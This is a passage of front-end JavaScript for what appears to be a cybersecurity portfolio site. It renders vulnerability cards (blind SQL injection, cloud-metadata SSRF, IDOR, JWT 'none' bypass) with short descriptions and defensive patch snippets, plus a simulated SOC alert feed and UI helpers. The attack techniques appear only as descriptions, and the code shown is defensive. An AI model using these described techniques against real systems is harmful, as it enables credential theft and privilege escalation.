        title: 'Blind SQL Injection in Auth Endpoint',
        cvss: 'CVSS 9.8 CRITICAL',
        cvssClass: 'cvss-crit',
        desc: 'Unsanitized user payload injected into dynamic SQL queries allows remote attackers to bypass authentication, dump backend database schemas, and escalate privileges.',
        patch: `// Secure Parameterized Prepared Statement (Node.js/pg)
const query = 'SELECT id, role, password_hash FROM users WHERE username = $1';
const result = await db.query(query, [sanitizedUsername]);`,
      },
      ssrf: {
        title: 'Cloud Metadata SSRF via Webhook Target',
        cvss: 'CVSS 8.6 HIGH',
        cvssClass: 'cvss-high',
        desc: 'Server fetches remote webhook URLs without verifying local network boundaries, allowing attackers to query AWS/GCP internal metadata services (http://169.254.169.254) for IAM session credentials.',
        patch: `// Strict IP Whitelisting & Private Range Fencing (Go)
func ValidateURL(rawURL string) bool {
    parsed, err := url.Parse(rawURL)
    if err != nil || (parsed.Scheme != "https") { return false }
    ips, _ := net.LookupIP(parsed.Hostname())
    for _, ip := range ips {
        if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() {
            return false // Block local metadata requests
        }
    }
    return true
}`,
      },
      idor: {
        title: 'Broken Object Level Authorization (IDOR)',
        cvss: 'CVSS 8.1 HIGH',
        cvssClass: 'cvss-high',
        desc: 'API endpoint \`/api/v1/documents/:id\` fails to validate that the currently authenticated JWT token matches the ownership record of the requested document entity.',
        patch: `// Tenant & Ownership Authorization Check (Python/FastAPI)
@router.get("/documents/{doc_id}")
async def get_document(doc_id: str, current_user: User = Depends(get_current_user)):
    doc = await db.documents.find_one({"_id": doc_id, "org_id": current_user.org_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found or unauthorized")
    return doc`,
      },
      jwt: {
        title: 'JWT "none" Alg Signature Bypass',
        cvss: 'CVSS 9.1 CRITICAL',
        cvssClass: 'cvss-crit',
        desc: 'JWT validation middleware accepts insecure headers with \`alg: none\` and ignores cryptographic signature verification, allowing arbitrary payload tampering for super-admin elevation.',
        patch: `// Enforce Cryptographic Signature Algorithm Verification (Rust/jsonwebtoken)
let validation = Validation::new(Algorithm::RS256);
validation.validate_exp = true;
let token_data = decode::<Claims>(&token, &DecodingKey::from_rsa_pem(&public_key)?, &validation)?;`,
      },
    };

    scenarioBtns.forEach((btn) => {
      btn.addEventListener('click', () => {
        scenarioBtns.forEach((b) => b.classList.remove('active'));
        btn.classList.add('active');

        const key = btn.getAttribute('data-scenario');
        const data = scenarios[key];
        if (data) {
          if (titleEl) titleEl.textContent = data.title;
          if (cvssEl) {
            cvssEl.textContent = data.cvss;
            cvssEl.className = `cvss-pill ${data.cvssClass}`;
          }
          if (descEl) descEl.textContent = data.desc;
          if (patchEl) patchEl.textContent = data.patch;
        }
      });
    });
  }

  /* ── Module 5: Live SOC Threat Radar ─────────────────────── */
  initSocRadar() {
    const streamBox = $('#soc-stream-container', this.container);
    const toggleBtn = $('#btn-toggle-soc-stream', this.container);
    const statBlocked = $('#soc-stat-blocked', this.container);

    if (!streamBox) return;

    let isStreaming = true;
    let blockedCount = 1482;

    const sampleEvents = [
      { tag: 'block', label: 'BLOCKED', msg: 'SSH Brute Force: 194.26.29.112 exceeded 5 attempts. IP banned for 24h.' },
      { tag: 'alert', label: 'ALERT', msg: 'Port Sweep: 185.220.101.4 scanned 64 ports on Edge Gateway 02.' },
      { tag: 'block', label: 'WAF_MITIGATED', msg: 'SQLi Filter: Intercepted UNION payload on /api/v1/search.' },
      { tag: 'pass', label: 'VERIFIED', msg: 'mTLS Handshake: Mutual auth verified for Worker Node #18.' },
      { tag: 'alert', label: 'ANOMALY', msg: 'Rate Limiter: Client 45.154.255.88 triggered 429 Too Many Requests.' },
      { tag: 'block', label: 'ZERO_DAY_SHIELD', msg: 'eBPF Sandbox intercepted illegal syscall from untrusted binary.' },
      { tag: 'pass', label: 'HEALTH_CHECK', msg: 'Cluster Consensus: 64/64 nodes reporting healthy telemetry.' },
    ];

    const addEvent = () => {
      if (!isStreaming) return;
      const now = new Date();
      const timeStr = now.toTimeString().split(' ')[0];
      const ev = sampleEvents[Math.floor(Math.random() * sampleEvents.length)];

      const item = document.createElement('div');
      item.className = 'soc-stream-item';
      item.innerHTML = `
        <span class="soc-time">${timeStr}</span>
        <span class="soc-tag soc-tag--${ev.tag}">${ev.label}</span>
        <span class="soc-msg">${ev.msg}</span>
      `;

      streamBox.appendChild(item);
      if (streamBox.children.length > 20) {
        streamBox.removeChild(streamBox.children[0]);
      }
      streamBox.scrollTop = streamBox.scrollHeight;

      if (ev.tag === 'block') {
        blockedCount++;
        if (statBlocked) statBlocked.textContent = blockedCount.toLocaleString();
      }
    };

    for (let i = 0; i < 4; i++) {
      addEvent();
    }

    setInterval(addEvent, 2200);

    if (toggleBtn) {
      toggleBtn.addEventListener('click', () => {
        isStreaming = !isStreaming;
        toggleBtn.textContent = isStreaming ? 'PAUSE STREAM' : 'RESUME STREAM';
      });
    }
  }
}

/* ─── Multi-Channel Floating Action Button (FAB) ─────────── */
function initFAB() {
  const fabWrapper = $('#fab-wrapper');
  const fabTrigger = $('#fab-trigger');
  if (!fabWrapper || !fabTrigger) return;

  const toggleFAB = (forceState) => {
    const isCurrentlyActive = fabWrapper.classList.contains('active');
    const newState = forceState !== undefined ? forceState : !isCurrentlyActive;
    
    fabWrapper.classList.toggle('active', newState);
    fabTrigger.setAttribute('aria-expanded', String(newState));
  };

  fabTrigger.addEventListener('click', (e) => {
    e.stopPropagation();
    toggleFAB();
  });

  // Close when clicking outside
  document.addEventListener('click', (e) => {
    if (!fabWrapper.contains(e.target)) {
      toggleFAB(false);
    }
  });

  // Close on Escape key
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && fabWrapper.classList.contains('active')) {
      toggleFAB(false);
      fabTrigger.focus();
    }
  });

  // Smooth click on any FAB action link
  $$('.fab-btn').forEach((btn) => {
    btn.addEventListener('click', () => {
      setTimeout(() => toggleFAB(false), 240);
    });
  });
}

/* ─── Magnetic Attraction Physics for Interactive UI ──────── */
function initMagneticButtons() {
  if (prefersReduced || window.matchMedia('(pointer: coarse)').matches) return;

  const magneticElements = $$('.magnetic');

  magneticElements.forEach((el) => {
    el.addEventListener('mousemove', (e) => {
      const rect = el.getBoundingClientRect();
      const x = e.clientX - (rect.left + rect.width / 2);
      const y = e.clientY - (rect.top + rect.height / 2);
      el.style.transform = `translate(${x * 0.22}px, ${y * 0.22}px)`;
    });

    el.addEventListener('mouseleave', () => {
      el.style.transform = '';
    });
  });
}

/* ─── Initialization ─────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  initLenis();
  initNav();
  initScrollReveal();
  initCounters();
  initSkillBars();
  initTimeline();
  initCardTilt();
  initFAB();
  initTerminal();
  initMorphingBoxes();
  initFounderPhotoVFX();

  // Initialize Professional IQ MAXX Cyber Suite Web Application
  new IQMaxxAppSuite();

  // Initialize Gallery 6x Procedural Canvas Engines & Interactive Actions
  const galleryManager = new GalleryVisualizerManager();
  initGalleryInteractiveButtons(galleryManager);

  // Initialize Three.js Hero Scene
  const canvas = $('#scene');
  if (canvas) {
    try {
      new CyberHeroScene(canvas);
    } catch (err) {
      console.warn('3D Cyber Hero initialization error:', err);
    }
  }
});
